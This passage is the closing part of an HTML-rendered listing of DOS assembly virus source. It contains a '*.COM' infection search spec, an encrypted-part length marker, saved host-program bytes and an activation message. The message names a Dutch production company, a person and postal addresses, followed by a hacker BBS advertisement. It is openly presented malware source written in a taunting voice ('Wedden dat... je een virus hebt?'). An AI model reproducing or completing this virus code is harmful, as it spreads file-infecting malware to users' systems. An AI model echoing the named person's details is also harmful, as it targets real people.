                </span><span class="sc6">Ret</span><span class="sc0">                             </span><span class="sc1">; Return to caller</span><span class="sc0">

</span><span class="sc5">CallPtr</span><span class="sc0">         </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">; Jump</span><span class="sc0">

</span><span class="sc5">FileSpec</span><span class="sc0">        </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Filesearch spec &amp; signature</span><span class="sc0">

</span><span class="sc1">; Activation message</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0">             </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc12">'RTL4'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Joop van den Ende Produkties BV'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Marco Daas (Casting Assistent)'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Postbus 397'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'1430 AJ  AALSMEER'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'van Cleeffkade 15'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'1413 BA  AALSMEER'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'The Netherlands'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Wedden dat... je een virus hebt?'</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">; First 4 bytes of the host program</span><span class="sc0">

</span><span class="sc5">OrgPrg</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'GB'</span><span class="sc0">                         </span><span class="sc1">; My initials (Glenn Benton)</span><span class="sc0">

</span><span class="sc5">CryptLen</span><span class="sc0">        </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Crypt</span><span class="sc0">                     </span><span class="sc1">; Length of encrypted part</span><span class="sc0">

</span><span class="sc5">VirLen</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MainVir</span><span class="sc0">                   </span><span class="sc1">; Length of virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sleep well, sleep in hell...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">;  컴컴컴컴컴컴컴컴컴컴&gt; and Remember Don't Forget to Call &lt;컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">;  컴컴컴컴컴컴&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span></div></body>
</html>
